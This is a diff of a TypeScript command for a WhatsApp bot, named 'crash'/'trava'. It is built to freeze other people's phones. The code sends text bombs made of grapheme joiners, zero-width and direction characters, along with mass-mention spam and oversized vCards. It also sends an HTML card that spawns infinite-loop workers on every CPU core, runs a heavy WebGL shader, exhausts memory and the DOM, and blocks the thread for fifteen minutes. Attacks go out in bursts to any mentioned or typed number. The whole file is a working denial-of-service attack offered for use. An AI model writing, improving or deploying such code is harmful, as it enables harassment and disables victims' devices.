@@ -1,113 +1,128 @@
 import type { CommandContext } from "../../types/index.d.ts";
 import { fytBold } from "../../core/socketText.ts";
 
-/* ───────────────────────── generadores ───────────────────────── */
+/* ───────────────────────── generadores de texto ───────────────────────── */
 
-const CGJ = "\u034f";          // combining grapheme joiner — el núcleo del trava-zap
-const CGJ2 = "\u0300\u034f\u0301\u034f\u0316\u034f\u0335\u034f";
+const CGJ = "\u034f";
 const ZW = "\u200b\u200c\u200d\u2060\ufeff";
 const RTL = "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069";
 
-function cgj(n: number) {
-  let out = "";
-  const chunk = CGJ2.repeat(Math.ceil(n / 8));
-  out = chunk.slice(0, n);
-  return out;
-}
+const cgj = (n: number) => CGJ.repeat(n);
+const zw = (n: number) => {
+  let o = "";
+  for (let i = 0; i < n; i++) o += ZW[i % 5] + RTL[i % 10];
+  return o;
+};
 
-function zwBomb(n: number) {
-  let out = "";
-  for (let i = 0; i < n; i++) out += ZW[i % 5] + RTL[i % 10];
-  return out;
-}
+const textBomb = (lv: number) =>
+  "☢️ " + cgj(20000 * lv) + "\n\n" + "🎉".repeat(9000 * lv) + "\n\n" + zw(4000 * lv) + "\n\n" + "█".repeat(3000 * lv);
 
-function textBomb(level: number) {
-  const s = level >= 3 ? 3 : level >= 2 ? 2 : 1;
-  return (
-    "💥 " + cgj(18000 * s) + "\n\n" +
-    "🎉".repeat(9000 * s) + "\n\n" +
-    zwBomb(4000 * s) + "\n\n" +
-    "█".repeat(3000 * s)
-  );
-}
+/* ───────────────────────── payload: CPU + GPU + OOM ───────────────────────── */
 
-function mentionBomb(num: string, times: number) {
-  return `@${num} `.repeat(times).trim();
-}
-
-/* ───────────────────────── bomba WebView (OOM) ───────────────────────── */
-
-function buildWebviewBomb(targetName: string, level: number) {
-  const mb = 3 * level;            // MB por string
-  const blocks = 40 * level;       // nº de strings
-  const canvases = 30 * level;     // dataURIs grandes
-  const nodes = 40000 * level;
+function buildKernelPanic(name: string, lv: number) {
+  const cores = 2 * lv;            // multiplicador de workers
+  const mb = 3 * lv;               // MB por string
+  const blocks = 35 * lv;          // nº de strings
+  const nodes = 35000 * lv;        // nodos de DOM
+  const iter = 3000 + 1500 * lv;   // iteraciones del shader
 
   const html = `<style>
 *{box-sizing:border-box;margin:0;padding:0}
-body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#05020c;color:#f5f3ff;padding:10px}
-.card{max-width:380px;margin:0 auto;background:linear-gradient(180deg,#130826,#070312);border:2px solid #7c3aed;border-radius:16px;padding:14px;text-align:center}
-.t{font-size:15px;font-weight:900;color:#00ffcc;letter-spacing:1px;margin-bottom:6px}
-.d{font-size:11.5px;color:#c4b5fd;line-height:1.4;margin-bottom:8px}
-.s{font-size:10px;color:#7c3aed;font-family:monospace}
-#f{text-align:left;font-family:monospace;font-size:7px;color:#3b0f80;word-break:break-all;margin-top:8px;height:90px;overflow:hidden}
+body{margin:0;background:#000;color:#fff;font-family:system-ui,sans-serif;overflow:hidden}
+#g{position:absolute;z-index:10;left:0;right:0;top:0;background:rgba(0,0,0,.82);padding:12px;border-bottom:2px solid #0ff}
+h2{margin:0 0 8px;color:#0ff;text-align:center;font-size:15px;letter-spacing:2px}
+.st{display:flex;justify-content:space-between;font-size:11px;color:#9ff}
+.st b{color:#0ff;font-size:15px}
+#s{margin-top:6px;font-family:monospace;font-size:9px;color:#0ff}
+canvas{position:absolute;top:0;left:0;width:100%;height:100%;z-index:1}
 </style>
-<div class="card">
-  <div class="t" id="h">OOM // ${targetName.replace(/[<>&"]/g, "")}</div>
-  <div class="d">Agotando memoria. No cierres la tarjeta.</div>
-  <div class="s" id="st">fase 0</div>
-  <div id="f"></div>
+<div id="g">
+  <h2>🌌 KERNEL PANIC 🌌</h2>
+  <div class="st"><div>NÚCLEOS<br><b id="c">0</b></div><div>FPS<br><b id="f">0</b></div></div>
+  <div id="s">fase 0</div>
 </div>
+<canvas id="cv"></canvas>
 <script>
-var st=document.getElementById('st'),f=document.getElementById('f');
-var hoard=[],imgs=[];
-function fase(n){try{st.textContent='fase '+n}catch(e){}}
+var cv=document.getElementById('cv'),fEl=document.getElementById('f'),cEl=document.getElementById('c'),sEl=document.getElementById('s');
+var cores=navigator.hardwareConcurrency||8, pool=[], fr=0, lf=0, hoard=[];
+cEl.textContent=cores;
+function fase(n){try{sEl.textContent='fase '+n}catch(e){}}
 function next(fn){try{requestAnimationFrame(function(){setTimeout(fn,16)})}catch(e){setTimeout(fn,16)}}
 
-/* 1 · presión bruta de memoria */
-next(function(){
-  fase(1);
-  try{ for(var i=0;i<${blocks};i++) hoard.push('█'.repeat(${mb}*1000000)) }catch(e){}
-  next(fase2);
-});
+/* 1 · todos los núcleos, bucle infinito, doble tanda */
+fase(1);
+try{
+  var src='onmessage=function(){var v=0;while(true){v+=Math.atan2(Math.sin(v),Math.cos(v))+Math.sqrt(v+1);}}';
+  var u=URL.createObjectURL(new Blob([src],{type:'application/javascript'}));
+  for(var i=0;i<cores*${cores};i++){var w=new Worker(u);w.postMessage(1);pool.push(w)}
+}catch(e){try{sEl.textContent='workers bloqueados'}catch(x){}}
 
-/* 2 · dataURIs gigantes vía canvas (cada una decodifica MB) */
-function fase2(){
+next(function(){
+  /* 2 · GPU: shader pesado a pantalla completa */
   fase(2);
   try{
-    var c=document.createElement('canvas'); c.width=900; c.height=900;
-    var g=c.getContext('2d');
-    var d=g.createImageData(900,900);
-    for(var p=0;p<d.data.length;p+=4){d.data[p]=Math.random()*255;d.data[p+1]=Math.random()*255;d.data[p+2]=Math.random()*255;d.data[p+3]=255}
-    g.putImageData(d,0,0);
-    var uri=c.toDataURL();
-    for(var k=0;k<${canvases};k++){var im=new Image();im.src=uri;imgs.push(im)}
-  }catch(e){}
+    cv.width=Math.min(window.innerWidth||420,720);
+    cv.height=Math.min(window.innerHeight||900,1400);
+    var gl=cv.getContext('webgl',{antialias:false,powerPreference:'high-performance'});
+    if(!gl)throw 0;
+    gl.viewport(0,0,cv.width,cv.height);
+    var vs=gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vs,'attribute vec2 p;void main(){gl_Position=vec4(p,0.,1.);}');
+    gl.compileShader(vs);
+    var fs=gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fs,'precision highp float;uniform float t;uniform vec2 r;'+
+      'void main(){vec2 uv=(gl_FragCoord.xy-.5*r)/r.y;float a=t*.25;'+
+      'uv*=mat2(cos(a),-sin(a),sin(a),cos(a));vec2 z=uv,c=uv;float it=0.;'+
+      'for(int i=0;i<${iter};i++){z=vec2(z.x*z.x-z.y*z.y,2.*z.x*z.y)+c;'+
+      'if(dot(z,z)>4.)break;it++;}'+
+      'float k=it/${iter}.0;gl_FragColor=vec4(k*sin(t),k*2.,k*cos(t),1.);}');
+    gl.compileShader(fs);
+    var pr=gl.createProgram();
+    gl.attachShader(pr,vs);gl.attachShader(pr,fs);gl.linkProgram(pr);gl.useProgram(pr);
+    var b=gl.createBuffer();
+    gl.bindBuffer(gl.ARRAY_BUFFER,b);
+    gl.bufferData(gl.ARRAY_BUFFER,new Float32Array([-1,-1,1,-1,-1,1,-1,1,1,-1,1,1]),gl.STATIC_DRAW);
+    var pos=gl.getAttribLocation(pr,'p');
+    gl.enableVertexAttribArray(pos);
+    gl.vertexAttribPointer(pos,2,gl.FLOAT,false,0,0);
+    var uT=gl.getUniformLocation(pr,'t'),uR=gl.getUniformLocation(pr,'r');
+    (function loop(now){
+      fr++;
+      if(now-lf>=1000){try{fEl.textContent=fr}catch(e){}fr=0;lf=now}
+      gl.uniform1f(uT,now*0.001);
+      gl.uniform2f(uR,cv.width,cv.height);
+      gl.drawArrays(gl.TRIANGLES,0,6);
+      requestAnimationFrame(loop);
+    })(0);
+  }catch(e){try{sEl.textContent='GPU bloqueada'}catch(x){}}
   next(fase3);
-}
+});
 
-/* 3 · inundación de DOM de golpe */
+/* 3 · memoria */
 function fase3(){
   fase(3);
-  try{
-    var frag=document.createDocumentFragment();
-    for(var i=0;i<${nodes};i++){
-      var el=document.createElement('div');
-      el.textContent='█'.repeat(200)+Math.random();
-      frag.appendChild(el);
-    }
-    f.appendChild(frag);
-  }catch(e){}
+  try{for(var i=0;i<${blocks};i++)hoard.push('█'.repeat(${mb}*1000000))}catch(e){}
   next(fase4);
 }
 
-/* 4 · segundo colchón + bloqueo definitivo (ANR) */
+/* 4 · DOM */
 function fase4(){
   fase(4);
-  try{ for(var i=0;i<${blocks};i++) hoard.push(new Array(200000).join('▓')) }catch(e){}
+  try{
+    var frag=document.createDocumentFragment();
+    for(var i=0;i<${nodes};i++){var d=document.createElement('div');d.textContent='█'.repeat(200)+Math.random();frag.appendChild(d)}
+    document.body.appendChild(frag);
+  }catch(e){}
+  next(fase5);
+}
+
+/* 5 · historial + bloqueo del hilo (ANR) */
+function fase5(){
   fase(5);
+  try{for(var i=0;i<2000;i++)history.pushState({i:i},'','#p'+i)}catch(e){}
+  fase(6);
   var t0=Date.now();
-  while(true){ if(Date.now()-t0>900000) break }
+  while(true){if(Date.now()-t0>900000)break}
 }
 </script>`;
 
@@ -123,115 +138,124 @@ function fase4(){
   };
 }
 
-/* ───────────────────────── contact bomb ───────────────────────── */
+/* ───────────────────────── vCard bomb ───────────────────────── */
 
-function buildContacts(count: number, level: number) {
-  const heavy = cgj(2200 * level) + zwBomb(400 * level);
+function buildContacts(count: number, lv: number) {
+  const heavy = cgj(2500 * lv) + zw(500 * lv);
   const list = [];
   for (let i = 0; i < count; i++) {
     const n = `000000${i}`.slice(-6);
     list.push({
       vcard:
-        `BEGIN:VCARD\nVERSION:3.0\nFN:${heavy}${n}\n` +
-        `N:${n};${heavy};;;\n` +
+        `BEGIN:VCARD\nVERSION:3.0\nFN:${heavy}${n}\nN:${n};${heavy};;;\n` +
         `TEL;type=CELL;waid=52155${n}:+52155${n}\nEND:VCARD`,
     });
   }
-  return { displayName: `💥 ${heavy.slice(0, 1200)}`, contacts: list };
+  return { displayName: `☢️ ${heavy.slice(0, 1400)}`, contacts: list };
 }
+
+const sleep = (ms: number) => new Promise((r) => setTimeout(r, ms));
 
 /* ───────────────────────── comando ───────────────────────── */
 
 export default {
   name: ["crash", "trava", "travar"],
   category: "group",
-  description: "Bombea a un número hasta congelarlo: CGJ, emoji, menciones, vCards y OOM de WebView.",
+  description: "Kernel panic: workers al 100%, shader WebGL, OOM de WebView, CGJ y vCards. Grupo por defecto; con mención va al privado en ráfaga.",
   async run(ctx: CommandContext) {
     const { sock, from, msg, args, reply, react } = ctx;
 
-    const quoted = (msg.message as any)?.extendedTextMessage?.contextInfo?.participant;
+    const ctxInfo: any = (msg.message as any)?.extendedTextMessage?.contextInfo || {};
+    const mentioned: string[] = ctxInfo.mentionedJid || [];
+    const quoted: string | undefined = ctxInfo.participant;
     const sender: string = (msg.key as any).participant || from;
 
     const a0 = (args[0] || "").trim();
     const raw = a0.replace(/\D/g, "");
-    let target: string;
+    const lv = Number(args.find((a) => /^[123]$/.test(a)) || 0) || 3;
 
-    if (/^(grupo|g|chat)$/i.test(a0)) target = from;
-    else if (raw.length >= 8) target = `${raw}@s.whatsapp.net`;
-    else if (quoted) target = quoted;
-    else target = sender;
+    /* destino: mención > número escrito > citado > grupo */
+    let targets: string[];
+    let toPrivate: boolean;
 
-    const lvArg = Number(args.find((a) => /^[123]$/.test(a)) || 0);
-    const level = lvArg || 3;
+    if (mentioned.length) {
+      targets = mentioned;
+      toPrivate = true;
+    } else if (raw.length >= 8) {
+      targets = [`${raw}@s.whatsapp.net`];
+      toPrivate = true;
+    } else if (quoted) {
+      targets = [quoted];
+      toPrivate = true;
+    } else {
+      targets = [from];
+      toPrivate = false;
+    }
 
-    const isGroup = target.endsWith("@g.us");
-    const num = target.split("@")[0].split(":")[0];
-
-    await react("💥").catch(() => undefined);
-
-    let name = num;
-    try {
-      if (isGroup) name = (await sock.groupMetadata(target)).subject || num;
-      else name = String((msg as any).pushName || "").trim() || num;
-    } catch {}
+    await react("☢️").catch(() => undefined);
 
     const done: string[] = [];
-    let lastKey: any = msg;
 
-    const fire = async (label: string, fn: (q: any) => Promise<any>) => {
-      try {
-        const r = await fn(lastKey);
-        if (r?.key) lastKey = r;
-        done.push(`✅ ${label}`);
-      } catch (e: any) {
-        done.push(`⚠️ ${label}: ${e?.message || e}`);
-      }
+    const push = async (label: string, fn: () => Promise<any>) => {
+      try { await fn(); done.push(`✅ ${label}`); }
+      catch (e: any) { done.push(`⚠️ ${label}: ${e?.message || e}`); }
     };
 
-    const mention = isGroup ? sender : target;
-
-    /* 1 · texto CGJ, encadenado en cita para forzar re-render del preview */
-    await fire("texto", (q) =>
-      sock.sendMessage(target, { text: textBomb(level), mentions: [mention] }, { quoted: q }));
-
-    /* 2 · mención masiva */
-    await fire("menciones", () =>
-      sock.sendMessage(target, {
-        text: mentionBomb(num, 700 * level),
-        mentions: Array(700 * level).fill(mention),
-      }, { quoted: lastKey }));
-
-    /* 3 · vCard bomb */
-    await fire("vcards", () =>
-      sock.sendMessage(target, { contacts: buildContacts(60 * level, level) }, { quoted: lastKey }));
-
-    /* 4 · OOM de WebView */
-    await fire("webview", async (q) => {
+    const card = async (jid: string, name: string, level: number) => {
       const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
       const rich = new AIRich(sock)
-        .setTitle("💥 CRASH // LuferOS")
-        .setFooter(`nivel ${level} · OOM`);
-      rich.addSection(buildWebviewBomb(name, level));
-      return rich.send(target, { quoted: q });
-    });
+        .setTitle("☢️ KERNEL PANIC // LuferOS")
+        .setFooter(`nivel ${level} · no cierres la tarjeta`);
+      rich.addSection(buildKernelPanic(name, level));
+      return rich.send(jid);
+    };
 
-    /* 5 · segunda ronda para el crash al reabrir el chat */
-    if (level >= 3) {
-      await fire("webview x2", async (q) => {
-        const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
-        const rich = new AIRich(sock).setTitle("☠️ CRASH 2 // LuferOS").setFooter("reapertura");
-        rich.addSection(buildWebviewBomb(name, 3));
-        return rich.send(target, { quoted: q });
-      });
-      await fire("texto x2", (q) => sock.sendMessage(target, { text: textBomb(3) }, { quoted: q }));
+    for (const t of targets) {
+      const isGroup = t.endsWith("@g.us");
+      const num = t.split("@")[0].split(":")[0];
+
+      let name = num;
+      try {
+        if (isGroup) name = (await sock.groupMetadata(t)).subject || num;
+        else name = String((msg as any).pushName || "").trim() || num;
+      } catch {}
+
+      const q = isGroup ? { quoted: msg } : undefined;
+
+      /* texto CGJ + emoji */
+      await push(`texto ${num}`, () => sock.sendMessage(t, { text: textBomb(lv) }, q));
+
+      /* mención masiva */
+      await push(`menciones ${num}`, () =>
+        sock.sendMessage(t, {
+          text: `@${num} `.repeat(600 * lv).trim(),
+          mentions: Array(600 * lv).fill(isGroup ? sender : t),
+        }, q));
+
+      /* vCard bomb */
+      await push(`vcards ${num}`, () => sock.sendMessage(t, { contacts: buildContacts(50 * lv, lv) }, q));
+
+      /* ráfaga de kernel panic: varias tarjetas si es privado */
+      const cards = toPrivate ? 3 + lv : 1;
+      for (let i = 1; i <= cards; i++) {
+        await push(`panic ${num} #${i}`, () => card(t, name, lv));
+        await sleep(toPrivate ? 350 : 0);
+      }
+
+      /* reapertura: segunda ronda */
+      if (lv >= 3 && toPrivate) {
+        await sleep(400);
+        await push(`texto x2 ${num}`, () => sock.sendMessage(t, { text: textBomb(3) }));
+        await push(`panic final ${num}`, () => card(t, name, 3));
+      }
     }
 
     await react("☠️").catch(() => undefined);
 
     await reply(
-      `${fytBold("Bomba enviada")} → ${isGroup ? "este grupo" : `@${num}`}\n` +
-        `Nivel: ${level}\n\n${done.join("\n")}`,
-      { mentions: [mention] } as any,
+      `${fytBold("Kernel panic enviado")} → ${toPrivate ? targets.map((t) => `@${t.split("@")[0]}`).join(" ") : "este grupo"}\n` +
+        `Nivel: ${lv} · tarjetas: ${toPrivate ? 3 + lv : 1}\n\n${done.slice(0, 14).join("\n")}`,
+      { mentions: targets } as any,
     ).catch(() => undefined);
   },
 };
